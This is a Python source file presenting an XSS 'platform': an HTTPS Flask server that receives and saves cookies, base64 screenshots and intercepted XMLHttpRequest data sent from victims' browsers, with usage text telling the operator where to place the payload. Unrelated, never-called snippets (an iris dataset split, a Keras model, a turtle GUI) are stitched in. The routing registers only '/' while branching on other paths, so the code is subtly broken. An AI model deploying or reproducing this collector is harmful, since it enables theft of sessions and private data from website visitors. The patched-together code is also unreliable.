import ssl
from flask import Flask, request
import base64
import urllib.parse
import time
import sys
import tensorflow as tf
from tensorflow import keras
from sklearn import datasets
from sklearn.model_selection import train_test_split
import numpy as np
import turtle
import tkinter as tk

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def handle_request():
    if request.method == 'GET':
        print(request.headers.get('User-Agent'))

        if "/cookie" in request.path:
            save_path = generate_save_path("Cookie")
            print("[+] New Cookie:")
            print("    Save as: " + save_path)
            save_data(request.path[15:], save_path)

    elif request.method == 'POST':
        print(request.headers.get('User-Agent'))
        req_datas = request.get_data()

        if request.path == "/screen":
            save_path = generate_save_path("CaptureScreen")
            print("[+] New CaptureScreen:")
            print("    Save as: " + save_path)
            base64_str = req_datas.decode()[33:]
            img_data = base64.b64decode(urllib.parse.unquote(base64_str))
            save_data(img_data, save_path)

        elif request.path == "/data":
            save_path = generate_save_path("XMLHttpRequest")
            http_data = urllib.parse.unquote(req_datas.decode())
            index = http_data.index(';data=')
            target_url = http_data[9:index]
            response_data = http_data[index+6:]
            print("[+] New XMLHttpRequest")
            print("    TargetURL: " + target_url)
            print("    Save as: " + save_path)
            save_data(response_data.encode(), save_path)

        else:
            print(req_datas.decode())

    return "Success"

def generate_save_path(data_type):
    localtime = time.strftime("%Y%m%d-%H%M%S", time.localtime())
    return f"{request.remote_addr}-{data_type}-{localtime}.txt"

def save_data(data, save_path):
    with open(save_path, 'wb') as file:
        file.write(data)

def data_mining_example():
    iris = datasets.load_iris()
    X_train, X_test, y_train, y_test = train_test_split(iris.data, iris.target, test_size=0.2, random_state=42)
    print("Data Mining Example:")
    print("X_train shape:", X_train.shape)
    print("X_test shape:", X_test.shape)
    print("y_train shape:", y_train.shape)
    print("y_test shape:", y_test.shape)

def ai_example():
    print("AI Example:")
    model = keras.Sequential([
        keras.layers.Dense(128, activation='relu', input_shape=(4,)),
        keras.layers.Dense(3, activation='softmax')
    ])
    model.compile(optimizer='adam', loss='sparse_categorical_crossentropy', metrics=['accuracy'])
    print("Model Summary:")
    model.summary()

def turtle_gui_example():
    print("Turtle GUI Example:")

    def draw_square():
        for _ in range(4):
            turtle.forward(100)
            turtle.right(90)

    window = tk.Tk()
    window.title("Turtle GUI")

    square_button = tk.Button(window, text="Draw Square", command=draw_square)
    square_button.pack()

    window.mainloop()

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print('pyXSSPlatform')
        print('Use to build an XSS Platform.')
        print('Author: 3gstudent')
        print('Usage:')
        print('%s <listen address> <listen port> <cert file>' % (sys.argv[0]))
        print('You can use openssl to generate the cert file:')
        print('openssl req -new -x509 -keyout https_svr_key.pem -out https_svr_key.pem -days 3650 -nodes')
        print('Payload:')
        print('- GetCookie')
        print('- CaptureScreen')
        print('- GET/POST')
        print('Eg.')
        print('%s 0.0.0.0 443 https_svr_key.pem' % (sys.argv[0]))
        sys.exit(0)
    else:
        address = sys.argv[1]
        port = int(sys.argv[2])
        certfile = sys.argv[3]

        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile)

        print("[*] HTTPS Server listening on %s:%d" % (address, port))
        print("[*] XSS url: https://%s/" % (address))
        print('    You should add the payload into the index.js')
        app.run(host=address, port=port, ssl_context=context)
